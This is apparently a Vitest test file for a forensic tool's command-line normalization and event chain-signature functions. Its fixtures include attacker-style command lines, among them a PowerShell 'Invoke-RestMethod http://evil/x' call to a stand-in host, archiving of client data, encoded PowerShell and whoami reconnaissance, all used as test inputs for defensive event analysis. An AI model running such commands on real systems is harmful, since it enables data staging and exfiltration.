import { describe, it, expect } from "vitest";
import { normalizeCommandLine, computeChainSignature } from "../../src/analysis/chainSignature.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

function ev(over: Partial<ForensicEvent> & { id: string }): ForensicEvent {
  return {
    id: over.id, timestamp: "2026-05-26T12:00:00Z", description: "event", severity: "High",
    mitreTechniques: [], relatedFindingIds: [], sourceScreenshots: [], ...over,
  };
}

describe("normalizeCommandLine", () => {
  it("reduces a full/quoted image path to its basename but keeps the arguments intact", () => {
    expect(normalizeCommandLine('"C:\\Windows\\System32\\cmd.exe" /c whoami')).toBe("cmd.exe /c whoami");
    expect(normalizeCommandLine("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -c Get-Date"))
      .toBe("powershell.exe -nop -c get-date");
    expect(normalizeCommandLine("/usr/bin/python3 /tmp/x.py")).toBe("python3 /tmp/x.py");
  });

  it("collapses whitespace and lowercases", () => {
    expect(normalizeCommandLine("  powershell.exe    -enc   ABC  ")).toBe("powershell.exe -enc abc");
  });

  it("does NOT strip arguments — two commands differing only in args stay distinct", () => {
    const a = normalizeCommandLine("powershell.exe -c Compress-Archive -Path D:\\ClientData");
    const b = normalizeCommandLine("powershell.exe -c Invoke-RestMethod http://evil/x");
    expect(a).not.toBe(b);
  });

  it("handles a bare image with no arguments and empty input", () => {
    expect(normalizeCommandLine("C:\\tmp\\a.exe")).toBe("a.exe");
    expect(normalizeCommandLine("   ")).toBe("");
  });
});

describe("computeChainSignature", () => {
  it("is equal for the SAME normalized command on the same host+parent, regardless of full path or case", () => {
    const a = ev({ id: "a", asset: "HOST-1.corp.local", processName: "powershell.exe", parentName: "explorer.exe",
      commandLine: '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -enc AAAA' });
    const b = ev({ id: "b", asset: "host-1", processName: "PowerShell.exe", parentName: "Explorer.exe",
      commandLine: "powershell.exe -enc AAAA" });
    expect(computeChainSignature(a)).toBe(computeChainSignature(b));
  });

  it("differs when the command line differs", () => {
    const a = ev({ id: "a", asset: "H", processName: "cmd.exe", commandLine: "cmd.exe /c whoami" });
    const b = ev({ id: "b", asset: "H", processName: "cmd.exe", commandLine: "cmd.exe /c hostname" });
    expect(computeChainSignature(a)).not.toBe(computeChainSignature(b));
  });

  it("falls back to scraping the command line from the description when commandLine is absent", () => {
    const structured = ev({ id: "a", asset: "H", processName: "powershell.exe", parentName: "explorer.exe",
      commandLine: "powershell.exe -nop -c Compress-Archive -Path D:\\x" });
    const scraped = ev({ id: "b", asset: "H", processName: "powershell.exe", parentName: "explorer.exe",
      description: "Sysmon Process create (EID 1) - powershell.exe - CommandLine=powershell.exe -nop -c Compress-Archive -Path D:\\x" });
    expect(computeChainSignature(scraped)).toBe(computeChainSignature(structured));
  });

  it("returns undefined when no command line can be determined", () => {
    expect(computeChainSignature(ev({ id: "a", asset: "H", processName: "svchost.exe" }))).toBeUndefined();
  });
});
